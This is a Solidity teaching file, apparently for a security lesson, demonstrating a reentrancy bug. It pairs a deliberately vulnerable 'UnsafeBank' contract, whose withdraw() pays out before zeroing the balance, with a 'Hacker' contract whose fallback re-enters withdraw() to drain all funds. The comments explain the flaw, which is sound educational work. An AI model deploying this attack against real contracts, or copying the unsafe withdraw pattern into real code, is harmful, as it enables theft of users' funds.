// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


/**
 * 
 * This Contract has a reentrancy! 
 *
 * Check out the function `withdraw()`.
 *  The call `msg.sender.call{value: balances[msg.sender]}("");`
 *  is the root of the problem
 * 
 *  `msg.sender` refers to the wallet or contract which invoked
 *  the transaction. If `msg.sender` is a contract,
 *  then the `.call()` will run that contract's fallback() function
 *  if it exists.
 * 
 *  The line itself transfers a `value` amount of ETH from this 
 *  contract to the calling address. Its intention is to only 
 *  transfer the amount of ETH which the address deposited originally 
 *  into the contract.
 * 
 *  A malicous contract can drain the contract of all of the funds
 *  by having their fallback function call `withdraw()`.
 * 
 *  If a `.call()` function fails it doesn't cause the whole transaction
 *  to revert, it only causes the return boolean to be set to false.
 * 
 */
contract UnsafeBank {
    mapping(address => uint256) public balances;

    constructor() payable {}

    // Add ETH to the contract's balance
    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw() public {
        if (balances[msg.sender] >= 1) {
            (bool result, ) = msg.sender.call{value: balances[msg.sender]}("");
            if (result) {
                balances[msg.sender]; //no-op line to silence compiler 
            }
            // keep users from reclaiming funds!
            balances[msg.sender] = 0;
        }
    }

    receive() external payable {}
}



/* A malicious contract */
contract Hacker {
    address payable public unsafeBank;

    constructor(address payable _unsafeBank) payable {
        unsafeBank = _unsafeBank;
    }

    // `fallback()` functions are triggered when you 'call' from
    // another contract 
    fallback() external payable {
        // you can call whatever you want from inside of them
        UnsafeBank(unsafeBank).withdraw();
    }

    // Calling this function will start the hack!
    // withdraw() will call fallback() which will call withdraw() again ...
    // The chain will break once the contract has no more ETH to distribute.
    function hackContract() external {
        UnsafeBank(unsafeBank).donate{value: 1}(address(this));
        UnsafeBank(unsafeBank).withdraw();
    }
}
